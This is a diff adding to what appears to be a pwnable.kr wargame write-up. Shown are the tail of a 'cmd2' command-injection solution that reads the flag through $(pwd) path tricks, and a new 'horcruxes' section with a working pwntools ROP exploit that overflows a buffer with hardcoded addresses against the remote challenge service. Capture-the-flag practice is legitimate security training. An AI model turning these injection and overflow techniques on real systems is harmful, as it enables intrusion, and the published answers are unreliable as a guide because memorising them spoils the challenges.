@@ -281,3 +281,35 @@ vm = ssh("cmd2", "pwnable.kr", 2222, "mommy now I get what PATH environment is f
 
 print(vm.run_to_end('./cmd2 "cd ..;cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)fla*"'))
 ```
+
+## horcruxes
+I have roped the addresses of A(), B(), C(), D(), E(), F(), and G(). Then, I roped the address for calling ropme() because I couldn't use the address of open("flag", 0) as it contained `0A`, which is a bad character ("\n").
+
+```python
+from pwn import *
+
+
+def read_until(value, decode=True):
+    recived = p.recvuntil(value).decode('utf-8', errors='replace')
+    return recived
+
+
+payload = b"A" * 120 + p32(0x0809fe4b) + p32(0x0809fe6a) + p32(0x0809fe89) + \
+    p32(0x0809fea8) + p32(0x0809fec7) + p32(0x0809fee6) + \
+    p32(0x0809ff05) + p32(0x0809fffc)
+
+p = remote("pwnable.kr", 9032)
+
+print(read_until(b"Menu:"))
+p.sendline(b"3")
+
+print(read_until(b"? :"), end='')
+p.sendline(payload)
+
+print(read_until(b"Harry"), end='')
+print(read_until(b')'))
+
+p.sendline(b"1")
+
+p.interactive()  # Then you have to enter sum of EXPs manually (consider integer overflow :D)
+```
